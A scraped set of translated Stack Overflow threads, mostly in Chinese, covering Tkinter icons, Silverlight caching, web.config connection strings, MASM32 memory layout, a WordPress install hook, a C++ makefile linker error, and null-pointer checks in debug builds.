但是，我不知道它是否可以通过 Tkinter 实现。上帝偏爱大胆的人，但轮到别人了？

**更新的问题**：为什么这在 Py3.6/Windows 上不起作用？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-03-01T14:29:52.937

最近，我在[一个旧 Ubuntu 论坛的帖子](https://ubuntuforums.org/archive/index.php/t-556868.html)中找到了适用于 Linux 的解决方案。

该解决方案使用带有空白（填充零）.xbm 文件的 iconbitmap 和 iconmask。

## 那么，首先，什么是 .xbm 文件？

.xbm 文件是一种纯文本（实际上是 C 代码！）图像格式，通常用于存储位图，数据存储为 8 位（256可能的值，从 0 到 255) 大小的元素，矩阵表示为单个一维数组加上定义其形状的值。

可以以任何方式解释数据，但通常将其解释为单色/灰度图像。

## 图标位图

我们的第一个方法称为iconbitmap，用于将位图设置为tkinter窗口的图标，我们可以输入.xbm文件的位置，它将表示为单色/灰度图标，其中像素/元素.xbm 代表不同的灰度级别，记住像素/元素是 0-255 范围内的 8 位值，因此值 0 将表示为黑色，255 将表示为白色，其他值将是介于两者之间的插值这两个值。

## 图标掩码

我们的第二种方法称为iconmask，这就是魔术发生的地方，它用于将alpha/透明度值设置为窗口图标的像素，我们可以输入.xbm文件的位置和.xbm中值为0的元素将设置为完全透明，我已经在 Debian 上使用 xfce4 对其进行了测试，透明度值似乎没有在 0-255 范围内线性插值。

## 我们的解决方案

有了这些信息，我们可以通过以下方式使用 tkinter 创建一个透明图标：

```
import tkinter

tk = tkinter.Tk()

# Your file path has to start with an "@" otherwise the methods will raise an exception.
xbm_location = "@blank.xbm"
# Here we call the iconbitmap method with the xbm location, since it's a blank xbm (filled with zeroes) it will be represented as a black icon.
tk.iconbitmap(xbm_location)
# Here we call the iconmask method with xbm location, since it's a blank xbm (filled with zeroes) it will be represented as a fully transparent icon.
tk.iconmask(xbm_location) 
```

还有我们的解决方案，我也在 Windows 上对其进行了测试，系统似乎只是忽略了 iconmask 方法，因此请坚持使用其他解决方案来处理您的 Windows 代码。

另一种可能的解决方案是使用方法 iconphoto 和从完全透明的 .gif 文件加载的 PhotoImage ，甚至[按照 Jay 的建议](https://stackoverflow.com/a/43298317/14922764)创建一个空白 PhotoImage ，但它似乎在 Windows 上也无法正常工作。

## 如何创建一个空白的.xbm？

创建空白 .xbm 非常容易，只需下载 .xbm 文件，从头开始创建，或将图像转换为 .xbm，如果 .xbm 不是空白（用零填充），请在文本中打开 .xbm编辑器并将数组中的所有值替换为“0x00”。

## 结论

就是这样，一个空白的.xbm、iconbitmap 和iconmask。现在您应该能够在 Linux 上的 tkinter 窗口中创建完全透明的图标...

万岁！

# silverlight - 您可以更改 Silverlight 下载指示器图形吗？

> ID：550052
> 
> 赞同：2
> 
> 时间：2009-02-15T00:29:04.297
> 
> 标签：silverlight

在下载 Silverlight 应用程序时，您会看到百分比文本和在其周围移动的蓝点作为进度指示器。是否可以将其修改为具有自定义进度指示器？拥有与将要运行的应用程序主题相匹配的东西会很好。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T01:51:01.323

是的。[在下载主 xap 源时，您可以使用asp:silverlight webcontrol](http://msdn.microsoft.com/en-us/library/system.web.ui.silverlightcontrols.silverlight(VS.95).aspx)的[SplashScreenSource 属性](http://msdn.microsoft.com/en-us/library/system.web.ui.silverlightcontrols.silverlight.splashscreensource(VS.95).aspx)（或 html <object> 标记的 splashScreenSouce 参数）指定要显示的网站应用程序中的松散 xaml 文件。

# silverlight - Can Silverlight downloads be zipped to speed up the download?

> ID：550058
> 
> 赞同：2
> 
> 时间：2009-02-15T00:30:35.247
> 
> 标签：silverlight

When Silverlight downloads the assemblies in your app can it be made to download them as zipped files and then uncompress them before running? This would speed up the download time for a large application.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T01:41:37.510

afaik silverlight 2 xap files are already zip compressed. So unless I misunderstood you there should not be much optimization through compression. (Edit: See other posts and comments on how to optimize through re-compression. Thanks!)

More Info: [Structure of the xap file](http://blogs.msdn.com/katriend/archive/2008/03/16/silverlight-2-structure-of-the-new-xap-file-silverlight-packaged-application.aspx)

What you could do is dynamically load additional assemblies after a small "bootstrap" version of your program distracts the user long enough to load the rest. ;) [Dynamically Loading an Assembly](http://www.silverlightshow.net/items/Silverlight-Dynamically-Loading-an-Assembly.aspx)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T01:45:33.913

The Silverlight 2 .xap file format is already compressed, if you rename it to .zip you'll be able to open it in Windows Explorer for example.

The default compression is not as optimal as it can be however and so there are a few free utilities you can use to reduce the filesize of the .xap often dramatically.

Here are the best links:

[http://web-snippets.blogspot.com/2008/11/another-one-on-repacking-xaps-to-reduce.html](http://web-snippets.blogspot.com/2008/11/another-one-on-repacking-xaps-to-reduce.html)

[http://blogs.msdn.com/delay/archive/2008/11/04/smaller-is-still-better-a-simple-step-continues-to-shrink-the-download-size-of-silverlight-2-applications.aspx](http://blogs.msdn.com/delay/archive/2008/11/04/smaller-is-still-better-a-simple-step-continues-to-shrink-the-download-size-of-silverlight-2-applications.aspx)

[http://blogs.telerik.com/ValeriHristov/Posts/08-05-13/Increasing_the_compression_ratio_of_the_XAP_files.aspx](http://blogs.telerik.com/ValeriHristov/Posts/08-05-13/Increasing_the_compression_ratio_of_the_XAP_files.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T00:31:41.623

Why don't you enable GZIP compression on your server, this should work for silverlight aswell.

# silverlight - Silverlight 是否每次都下载程序集？

> ID：550063
> 
> 赞同：5
> 
> 时间：2009-02-15T00:33:28.563
> 
> 标签：silverlight

每次您访问该站点时都会下载 Silverlight 应用程序，还是会检查版本/大小信息并仅下载较新版本的文件？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-02-15T02:08:56.647

Silverlight 2 在这方面没有什么特别之处，我读过的最简洁的解释来自silverlight.net 上的[这篇文章：](http://silverlight.net/forums/t/18701.aspx)

> “Silverlight 与任何其他 Web 内容都属于相同的缓存规则。如果用户清除了他们的缓存，则必须重新下载您的 xap。在正常情况下，只有在更改或缓存过期时才会下载 xap。”

[您可以按照此处列出的步骤](http://silverlight.net/forums/t/11995.aspx)控制缓存何时过期：

> 您可以为您的 XAP 文件打开 Enable Content Expiration HTTP header 选项。打开 IIS 管理器，转到 Default Web Site 并找到 silverlight 项目的 Web 站点。在 ClientBin 下找到 XAP 文件。转到 XAP 文件的属性页面，在 HTTP Headers 选项卡上，打开“Enable Content Expiration”，单击“Expire Immediately”单选按钮。保存更改。
> 
> 这样，当您刷新页面时，无需关闭浏览器即可下载新的 XAP（只有新的 XAP）。

这个[相关的帖子](https://stackoverflow.com/questions/307709/how-do-you-force-firefox-to-not-cache-or-re-download-a-silverlight-xap-file)也可能很有趣。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T00:37:50.423

这取决于您如何配置网络服务器标头以及客户端如何配置其浏览器缓存策略。

通常浏览器设置默认是可以的。您可能需要检查您的网络服务器是否正确配置了过期、etag 和缓存的相应标头值。您可以使用 Firebug 之类的工具来检查这些设置，并使用 Yslow 来测量其他客户端性能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-12-30T04:54:48.020

如果您想在 Hotmail 中通过 silverlight 发送 pix.... 使用其他方法可能更简单，除非您是一个极客或每次都想下载 silverlight。有一个按钮会很好，而且它可以正常工作。对普通人来说太难了。KISS... Silverlight 技术咨询不收费。个人经验是（厌倦了silverlight下载......我只是附上pix或发布到Picasa并发送链接）

# c# - 如何从 web.config 文件中检索 connectionString？

> ID：550072
> 
> 赞同：1
> 
> 时间：2009-02-15T00:39:51.697
> 
> 标签：c#, xml, parsing, web-config, connection-string

我正在用 C# 编写一个客户端应用程序，它应该从我编写的另一个应用程序更改 web.config 文件中的 ConnectionString 设置。我怎样才能实现这个目标？

有没有办法在我的应用程序中加载 web.config 文件并读取/更改其面向对象的数据？或者我是否需要像解析一个完整的“未知”XML 文件一样解析它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T00:55:49.647

如果您从另一个应用程序执行此操作，则可以使用[VirtualDirectoryMapping](http://msdn.microsoft.com/en-us/library/system.web.configuration.virtualdirectorymapping.aspx)类：

```
VirtualDirectoryMapping vdm = new VirtualDirectoryMapping(@"C:\Inetpub\wwwroot\YourApplication", true);
WebConfigurationFileMap wcfm = new WebConfigurationFileMap();
wcfm.VirtualDirectories.Add("/", vdm);

// Get the connectionString
Configuration config = WebConfigurationManager.OpenMappedWebConfiguration(wcfm, "/");
string connection = config.ConnectionStrings.ConnectionStrings["YourConnectionString"]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T00:57:47.850

我会使用 RMI 来查询其他应用程序的 ConnectionString。

# assembly - MASM32 内存位置

> ID：550079
> 
> 赞同：1
> 
> 时间：2009-02-15T00:44:44.540
> 
> 标签：assembly, x86, masm32

我正在尝试使用 masm32 程序集从主内存中读取数据，为了做到这一点，我创建了（如先前在我的另一个问题的答案中所建议的那样）一个数组，该数组将包含非常分离的内存位置（以避免从缓存）。我已经设法创建了数组并让它被读取，但是，我有一个问题。我已经做过并测试过的这个数组正在使用我给它的数据（即数字）并且一切正常。但是我需要内存位置，但我在任何地方都找不到地图或对这些位置的引用。我的意思是我需要类似的东西：

```
my_arr db 5, 2, 8, 9, 1, 7, 3, 0, 4, 6 
```

但我应该使用相应的内存位置保留字而不是使用数字。但我找不到它们 =( 甚至不知道还要寻找什么。

* * *

**编辑**

让我检查一下是否正确，然后您告诉我可以（而不是使用数组，而是使用变量之间的所有空间来强制从主存储器读取，对吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-15T01:13:53.987

正如您所说，这是一个（连续）字节数组：

```
my_arr db 5, 2, 8, 9, 1, 7, 3, 0, 4, 6 
```

这是一个占用 10 MB 的变量（相对于 CPU 缓存来说很大）：

```
wasted_space BYTE 10485760 DUP(?) 
```

这里有几个变量，它们之间有很多浪费的空间：

```
my_var_1 db 5
spacer_1 BYTE 10485760 DUP(?)
my_var_2 db 2
spacer_2 BYTE 10485760 DUP(?)
my_var_3 db 8
spacer_3 BYTE 10485760 DUP(?)
my_var_4 db 9
spacer_4 BYTE 10485760 DUP(?)
my_var_5 db 1
spacer_5 BYTE 10485760 DUP(?)
my_var_6 db 7
spacer_6 BYTE 10485760 DUP(?)
my_var_7 db 3
spacer_7 BYTE 10485760 DUP(?)
my_var_8 db 0
spacer_8 BYTE 10485760 DUP(?)
my_var_9 db 4
spacer_8 BYTE 10485760 DUP(?)
my_var_10 db 6 
```

这（在数据段中创建变量）是获取一些数据内存地址的一种方法（变量不包含地址......相反，变量位于地址处）。

获取内存地址的另一种方法是调用 O/S API，它从堆中分配内存并返回分配的内存的地址，例如 HeapAlloc 或 VirtualAlloc API。

* * *

我不知道你为什么在 ASM 中这样做（学习汇编除外）。如果要学习缓存，我原以为您也可以使用 C 来做到这一点（而且更容易）。

无论如何，我对缓存很好奇：多少空间足以导致缓存未命中？需要多少个不同的变量才能开始导致未命中（假设缓存是拆分的，因此可以包含多个（但只有少数）宽间距的内存缓存）？

显然，多年来，它（缓存）已成为一个复杂的主题。[http://lwn.net/Articles/252125/](http://lwn.net/Articles/252125/)是一篇链接自维基百科的文章。本文包括一些图表，例如**图 3.11: Sequential Read for Multiple Sizes**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T06:37:41.730

## 汇编中的间接内存访问

要将数组中的字节视为内存地址，您需要将它们加载到可用作基地址的寄存器中，然后访问该寄存器指向的内存：

```
MOV AX, [MY_ARR+3]  ; Element 3 in array, that is 9
MOV BX, [AX]        ; Read from that address 
```

## 关于缓存

请注意，您的缓存可能比该数组覆盖的内存地址范围大得多，因此所有内容都适合缓存。

此外，请考虑您的缓存可能是关联的，这意味着如果相距很远的地址碰巧不在同一（完整）缓存行上，则它们可以一起放入缓存中。

要真正用完缓存并保证您必须直接访问内存，您应该（在循环中）访问一组比缓存更大的连续内存位置。即创建一个与缓存一样大的数组。还要考虑到可能有多层缓存（L1、L2，可能是 L3 甚至更多），所以你需要多大取决于你想要溢出的缓存。

* * *

我用 C 语言编写了一个程序来计时内存和缓存访问一次，并通过一些统计计算和补偿时间测量开销（在如此短的时间范围内是不可忽略的），得到了非常准确的结果（可能是通过运行更长时间的测试并等待标准偏差下降来获得所需的准确度）。

然而，我的程序并不是最有效的方法，并且也没有暗示太多关于缓存的关联性（我必须根据配色方案的知识单独测量）。[然而，在Larry McVoy 和 Carl Staelin 的 SIGMETRICS 2005 工作中，](http://iss.cs.cornell.edu/publications/papers/SIGMETRICS2005.pdf)两者都以相对独立于架构的方式相当有效地完成了一些深思熟虑的技巧。

# cocoa - Cocoa 应用程序完成启动

> ID：550080
> 
> 赞同：0
> 
> 时间：2009-02-15T00:45:48.377
> 
> 标签：cocoa

有什么方法可以判断 Cocoa 应用程序（例如 Safari）是否已完成启动并能够响应？我知道在实际代码中使用委托很容易，但这对于我正在做的事情是不可能的。

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-15T00:59:25.333

查看 NSWorkspace 和 NSWorkspaceDidLaunchApplicationNotification。像这样的东西：

```
[[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(appDidLaunch:) name:NSWorkspaceDidLaunchApplicationNotification object:nil] 
```

传递给指定方法的 NSNotification 对象将包含有关启动的应用程序、其路径等信息。例如：

```
- (void)appDidLaunch:(NSNotification*)note
{
    NSLog(@"app launched: %@", [note userInfo]);
} 
```

编辑：这仅适用于桌面可可应用程序 - 我相当确定这在 Cocoa Touch 中是不可能的。只是澄清一下。

# wordpress - 如何在安装 Wordpress 之前删除默认的 hello world 帖子

> ID：550086
> 
> 赞同：1
> 
> 时间：2009-02-15T00:49:40.240
> 
> 标签：wordpress

我多次安装 Wordpress，每次安装后都必须手动删除 hello world 帖子。这令人生畏！

我怎样才能防止这个帖子出现。博客链接的同样问题。

谢谢.w

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-13T20:18:03.060

在`wp-content`文件夹中，定义一个名为 的文件`install.php`，并在其中放置一个`wp_install_default`函数。由于假定了某种默认类别，因此最好创建至少一个类别（源自 的代码示例`/wp-admin/includes/upgrade.php`）：

```
<?php
  function wp_install_defaults() {
    global $wpdb;
    // Default category
    $cat_name = $wpdb->escape(__('Uncategorized'));
    $cat_slug = sanitize_title(_c('Uncategorized|Default category slug'));
    $wpdb->query("INSERT INTO $wpdb->terms (name, slug, term_group) VALUES ('$cat_name', '$cat_slug', '0')");
    $wpdb->query("INSERT INTO $wpdb->term_taxonomy (term_id, taxonomy, description, parent, count) VALUES ('1', 'category', '', '0', '1')");
    }   
?> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-15T01:08:45.217

您可以删除在 中创建初始帖子和评论的代码`wp-admin/includes/upgrade.php`，但在我看来，任何解决方案都将比每次安装点击“删除”一次更耗时（升级等）......

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T01:06:30.107

在 2.7.1 版本中，这些项目是在 /wp-admin/includes/upgrade.php 的 wp_install_defaults() 中创建的。

它不返回任何值，因此您应该安全地评论或删除函数的内容。或者您可以在第 70 行注释掉对它的唯一调用。

请记住，这不是升级证明 - 如果您升级您的 WP 版本，您可能需要再次执行此操作

# c++ - 关于未定义引用的令人沮丧的 C++ 编译器错误

> ID：550098
> 
> 赞同：0
> 
> 时间：2009-02-15T01:07:11.540
> 
> 标签：c++, linker

所以，这是一个愚蠢的错误问题，但我已经解决了大约一个小时，似乎无法解决它。

我有一个 main.cpp 类，其中充满了随机 GUI 废话（我相信与我的问题并不真正相关），但在我的一种方法中，我引用了我的另一个类“TiffSpec”

TiffSpec 是我编写的一个类，到目前为止还没有编译错误。我得到的编译错误是：

“未定义的引用`TiffSpec::TiffSpec(std::basic_string<char, std::char_traits<char>, std::allocator<char> >)`”

注意：我不认为这是字符串类的问题，因为我尝试编写默认构造函数并引用它，但在没有“std::basic_...”的情况下仍然出现相同的错误。

TiffSpec.h、TiffSpec.cpp 和 main.cpp 都在同一个目录下。

这是 main.cpp 中的代码，直到出现错误：

```
#include <GL/glut.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <string.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <ctype.h>
#include <vector>
#include <list>
#include <typeinfo>
#include <math.h>
#include "TiffSpec.h"

/*  Create checkerboard image   */
#define checkImageWidth 1024

#define checkImageHeight 1024
GLubyte checkImage[checkImageHeight][checkImageWidth][3];

static GLint height;

//list of all non-main methods
void init(void);
void display(void);
void reshape(int w, int h);
void motion(int x, int y);
void read_next_command(unsigned char key, int x, int y);
void makeCheckImage(void);

void main_loop(char line[]);
void evaluateLine(char line[], std::vector<char> delimiters);
void evaluateCommand(std::list<std::string> command);

void read(std::list<std::string> command);
void draw(std::list<std::string> command);
void color(std::list<std::string> command);
void move(std::list<std::string> command);
void TiffStat(std::string fileName);

std::string convertInputToFloating(std::string input);
std::string trimExtraZeros(std::string input);
std::vector<char> getDelimiters();
//end of list

void
TiffStat(std::string fileName)
{
    TiffSpec * testing = new TiffSpec(fileName);
} 
```

以下是 TiffSpec.h 中代码的开头：

```
#include <GL/glut.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <string.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <ctype.h>
#include <vector>
#include <list>
#include <typeinfo>
#include <math.h>
#include <exception>

#ifndef TIFFSPEC_H_
#define TIFFSPEC_H_

using namespace std;

class TiffSpec {
public:
   TiffSpec();
   TiffSpec(std::string filename); 
```

为了更好地衡量，这里有一些来自 TiffSpec.cpp 的代码

```
#include "TiffSpec.h"
#include <algorithm>

bool isLittleEndian();
void ByteSwap_(unsigned char * b, int n);
bool tagRecognized(unsigned short tag);
bool fieldTypeRecognized(unsigned short fieldType);
void gatherValues(IFDEntry & entry, ifstream &fileStream);
valueTypes retrieveCorrectType(unsigned short fieldType, unsigned long numberOfValues);
int getFieldByteSize(short fieldType);

TiffSpec::TiffSpec()
{}

TiffSpec::TiffSpec(std::string fileName)
{
std::ifstream fileStream; 
```

知道我的问题可能是什么吗？此外，有没有更有效的方法来表示编码块，而不是在每行之前写 4 个空格？在参考指南中查看并没有看到任何内容...

好的，我想我知道出了什么问题。我第一次使用 eclipse（至少在 c++ 中）并且在某些方面被 MSVS 宠爱了。其中一种方法是制作文件。我认为问题是我的makefile。

makefile 是提供给我的。我想我需要参考这些新类，但是在哪里呢？我需要对 .h 和 .cpp 文件都这样做吗？

生成文件：

```
SHELL = /bin/sh
prefix = /usr
CC = gcc
C++ = g++ 
GLUT_LIBS = $(prefix)/lib/libglut.so.3
X_LIBADD =  -lXmu -lXext -lXi -lX11
INCLUDES = -Iinclude -I$(prefix)/include  
LDADD = $(GLUT_LIBS) $(prefix)/lib/libGLU.so.1 $(prefix)/lib/libGL.so.1  -lm 
CFLAGS = -g -O2 -Wall -fomit-frame-pointer -ffast-math -fexpensive-optimizations-D_REENTRANT
COMPILE = $(CC) $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS)
LINK = $(CC) $(CFLAGS) $(LDFLAGS) -o $@

.SUFFIXES:
.SUFFIXES: .cpp .c .o 

.c.o:
   $(COMPILE) -c $<

.cpp.o:
    $(C++) $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS) -c $<

all: main

CLI_OBJECTS=main.o 

main: $(CLI_OBJECTS)
   $(LINK) $(CLI_OBJECTS) $(LDADD) $(LIBS)

clean:
     -rm -f *.o $(PROGRAMS) 
```

我相信这与只有 main.o 存在有关。但是我究竟需要写什么来纠正它对我来说是未知的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T01:14:13.613

确保您正在链接`TiffSpec.cpp`到您的项目。如何执行此操作取决于您的开发环境。

对于 GCC，请确保添加`TiffSpec.o`到您的链接器（并编译`TiffSpec.cpp`成`TiffSpec.o`，当然）。

对于 MSVC，请确保添加`TiffSpec.cpp`要编译并链接到可执行文件中。（整我）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T01:28:40.287

这`CLI_OBJECTS`行似乎列出了目标文件。添加 TiffSpec.o：

```
CLI_OBJECTS=main.o TiffSpec.o 
```

* * *

链接命令来自 makefile 中的这条规则：

```
main: $(CLI_OBJECTS)
   $(LINK) $(CLI_OBJECTS) $(LDADD) $(LIBS) 
```

这表示`main`应该`CLI_OBJECTS`通过运行下面一行的命令从列出的文件构建。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T01:17:51.997

确保您在 TiffSpec.o 中进行链接。

# c++ - 调试编译的可执行文件：为什么不在无效写入 NULL 时优雅地中止？

> ID：550106
> 
> 赞同：3
> 
> 时间：2009-02-15T01:15:56.463
> 
> 标签：c++, error-handling, debugging, segmentation-fault

我对 C/C++ 不了解的是：

是的，每个人都使用它来获得极快的可执行文件，因此他们在打开优化的情况下进行编译。

但是对于打开调试信息的编译，我们并不关心速度。那么为什么不在该编译模式中包含更多信息，例如在它们发生之前检测一些段错误呢？`assert(ptr != NULL)`实际上，在每次访问指针之前插入一个`ptr`。为什么编译器不能这样做？同样，默认情况下应该关闭，但我认为应该有这种可能性。

**编辑：**有人说我建议的检测没有意义，或者没有做任何报告不会做的`segmentation fault`事情。但是我想到的只是一个更优雅和信息丰富的中止，它会打印出问题代码的文件名和行号，就像 an`assert()`会做的那样。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-15T01:17:58.377

在这种情况下程序应该做什么？如果它通知用户一个错误，那么这就是 segfault 所做的。

如果它应该继续运行并避免错误，它怎么知道该怎么做？

更不用说如果它确实神奇地知道如何正确继续，那么您的发布版本中就有一个错误（调试版本旨在帮助您识别和修复错误 - 而不是隐藏它们）。

* * *

针对添加到问题中的其他信息（我想我误解了您的意图）：

> 我想到的只是一个更优雅和信息丰富的中止，它打印有问题的代码的文件名和行号，就像 assert() 会做的那样。

这是编译器可以做的事情——正如你所说，编译器本质上会自动插入`assert()`一个指针被取消引用的任何地方。这可能会显着增加调试版本的大小，但对于许多（或大多数）目的来说，它可能仍然是可以接受的。我认为这对于编译器来说是一个合理的选择。

我不确定编译器供应商会说什么……也许在[Microsoft 的 Connect 网站上发布一个关于 VC++ 产品](http://connect.microsoft.com/VisualStudio)的请求，看看他们怎么说。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-02-15T01:27:55.937

你的建议有几个主要问题：

您希望编译器检测什么条件？在 Linux/x86 上，未对齐的访问可能导致`SIGBUS`堆栈溢出`SIGSEGV`，但在这两种情况下，技术上都可以编写应用程序来检测这些情况并“优雅地”失败。 `NULL`可以检测到指针检查，但最隐蔽的错误是由于无效的指针访问，而不是`NULL`指针。

C 和 C++ 编程语言提供了足够的灵活性，因此运行时不可能 100% 成功地确定给定的随机地址是否是任意类型的有效指针。

当运行时环境检测到这种情况时，您希望运行时环境做什么？它不能纠正这种行为（除非你相信魔法）。它只能继续执行或退出。但是等一下……这就是在传递信号时已经发生的事情！程序退出，生成核心转储，应用程序开发人员可以使用该核心转储来确定程序崩溃时的状态。

您所提倡的实际上听起来像是您想在调试器中运行您的应用程序 ( `gdb`) 或通过某种形式的虚拟化 ( `valgrind`)。这已经是可能的，但默认情况下这样做是没有意义的，因为它对非开发人员没有任何好处。

更新以回应评论：

没有理由修改调试版本的编译过程。如果您需要应用程序的“温和”调试版本，您应该在调试器中运行它。将您的可执行文件包装在一个透明地为您执行此操作的脚本中非常容易。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T01:24:03.683

我同意 Michael Burr 的观点，即这并没有真正起到任何作用或帮助任何事情。

此外，这仍然不适用于比空指针更隐蔽且难以追踪的悬空指针。

至少对于空指针来说，在取消引用它们之前确保它们是有效的很简单。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T02:38:47.043

我认为原始发布者希望应用程序在调试器中停止。您将有权访问所有堆栈变量和堆栈，因此您将有机会弄清楚您的程序为何处于这种状态。

如果您使用 C/C++ 进行开发，那么调试内存管理器可以为您节省大量时间。缓冲区溢出、访问已删除的内存、内存泄漏等很容易找到和修复。市场上有几种，或者您可以花 2 或 3 天时间编写自己的代码并获得 90% 的所需功能。如果您在没有它们的情况下编写应用程序，那么您的工作就会比需要的困难得多。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T20:00:52.817

`assert(ptr != NULL)`在取消引用指针不起作用之前，还有一个简单的不起作用的原因：并非每个无效指针（即使是那些以 NULL 开头的指针）实际上都等于 0。

首先考虑您有一个包含多个成员的结构的情况：

```
struct mystruct {
    int first;
    int second;
    int third;
    int fourth;
}; 
```

如果您有一个指向的指针`ptr`并且`mystruct`您尝试访问`ptr->second`，编译器将生成将 4（假设为 32 位整数）添加到`ptr`该内存位置并访问该内存位置的代码。如果`ptr`为 0，则实际访问的内存位置将为 4。这仍然无效，但不会被简单的断言捕获。（可以合理地期望编译器`ptr`在添加 4 之前检查地址，在这种情况下，断言会捕获它。）

其次，考虑您有一个数组`struct mystruct`并将任意元素传递给另一个函数的情况。如果您尝试访问数组的第二个元素，它将在第一个指针之后的 16 个字节处开始。没有办法合理地期望编译器在所有情况下都能可靠地执行您想要的操作，而不会捕获合法的指针算术。

您真正想要做的是使用操作系统和硬件来捕获无效和未对齐的内存访问并终止您的应用程序，然后弄清楚如何获取您需要的调试信息。最简单的方法就是在调试器中运行。如果您在 Linux 上使用 gcc，请查看[当我的 C++ 应用程序崩溃时如何生成堆栈信息](https://stackoverflow.com/questions/76822/how-to-generate-a-stacktace-when-my-c-app-crashes-using-gcc-compiler)。我假设有类似的方法可以用其他编译器做同样的事情。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-15T01:39:53.737

所以你是说在系统抛出错误之前，它应该抛出一个错误......警告你即将发生的错误？

有什么意义？当我遇到段错误时，我知道这意味着我遇到了段错误。我不需要单独的消息首先说“你现在会遇到段错误”。

我完全错过了这里的重点吗？:p

*编辑：* 我明白你在编辑中的意思，但实施起来并不容易。问题在于，如果您访问错误的指针，决定发生什么的不是编译器、语言或运行时。该语言正式对此不作任何承诺或保证。相反，操作系统会触发一个错误，而不知道这是一个调试可执行文件，也不知道哪个行号触发了问题，或者其他任何事情。这个错误唯一说的是“你试图访问地址 X，我不能允许。死”。编译器应该如何处理这个？

那么谁应该生成这个有用的错误消息呢？如何？编译器可以这样做，当然，但是将*每个*指针访问包装在错误处理中，以确保如果发生段错误/访问冲突，我们会捕获它，并改为触发断言。问题是，这将*非常缓慢*。不仅“发布太慢”，而且“太慢无法使用”。它还假定编译器可以访问您调用的*所有代码。*如果调用第三方库中的函数怎么办？内部的指针访问不能包含在错误处理代码中，因为编译器不会为该库生成代码。

操作系统*可以*做到这一点，假设它愿意/能够加载相关的符号文件，以某种方式检测你是否正在运行调试可执行文件等等......只是这样它就可以打印出一个行号。谈论过度工程。这几乎不是操作系统的工作。

最后，你会通过这样做获得什么？为什么不简单地启动你的调试器呢？当发生这种情况时，它会自动中断，为您提供精确的行号和其他所有内容。

可以做到，但会非常复杂，涉及编译器和操作系统，收益也非常小*。*你会得到一个弹出框，告诉你调试器已经能够告诉你的信息。*有了这些信息，您就可以……无论如何*启动调试器以找出问题所在。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-15T02:30:13.117

作为操作系统的一部分，已经有一个等价的 assert(prt != NULL) 。这就是为什么你会得到一个段错误，而不是仅仅覆盖 0 地址的重要数据，然后真正搞砸系统。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-15T19:39:39.543

假设您有一个可执行文件的符号文件，则可以将崩溃的位置映射到行号。正如其他人所提到的，如果您在调试器中运行它，调试器会为您执行此操作。Visual C++ 甚至提供“即时”调试，当程序崩溃时，您可以将调试器附加到崩溃的进程以查看问题所在。

但是，如果您想在未安装 Visual C++ 的机器上拥有此功能，仍然可以通过一些编码来实现。`SetUnhandledExceptionFilter`您可以使用将在程序崩溃时调用的异常处理程序来设置。在处理程序中，您可以查看异常记录并用于`SymGetLineFromAddr64`确定正在执行的源代码行。“调试帮助”库中有许多函数可以让您提取各种信息。请参阅[MSDN 上](http://msdn.microsoft.com/en-us/library/ms679309(VS.85).aspx)的文章，以及[www.debuginfo.com](http://www.debuginfo.com)上的文章。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-02-16T09:48:25.400

好主意，但仅限于一种特殊情况。那是在您取消引用函数指针之前。原因是调试器总是会启动，但在取消引用空函数指针后，堆栈会被拍摄。因此，您很难找到有问题的代码。如果调用者在调用之前进行了检查，调试器将能够为您提供完整的堆栈。

更通用的检查是查看指针是否指向可执行的内存。NULL 不是，但许多操作系统也可以使用 CPU 功能使特定的内存段不可执行。

# c# - 我可以使用哪些资源来学习分析/优化？

> ID：550109
> 
> 赞同：6
> 
> 时间：2009-02-15T01:18:10.310
> 
> 标签：c#, .net, optimization, profiling

我刚刚继承了一个运行速度很慢的 C# 项目，必须开始对其进行优化。我首先想做的是了解更多关于分析/优化的知识，因为我以前不必这样做。所以问题是我从哪里开始，我可以阅读哪些书籍/博客/文章？

我确实知道 .net 分析器，如 ANTS 分析器等，但我不知道如何有效地使用它们。我还没有真正使用过它，只是让它在一些示例应用程序上运行以处理输出。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-02-21T21:21:31.870

优化代码有两个步骤。

首先，你需要找出什么是慢的。这就是分析，正如您可能猜到的，分析器通常用于此目的。大多数分析器通常易于使用。您通过分析器运行您的应用程序，当它终止时，分析器将显示在每个函数中花费了多少时间，独占（此函数不计算从该函数调用的函数中花费的时间）以及包含（在此中花费的时间）函数，包括子函数调用）。

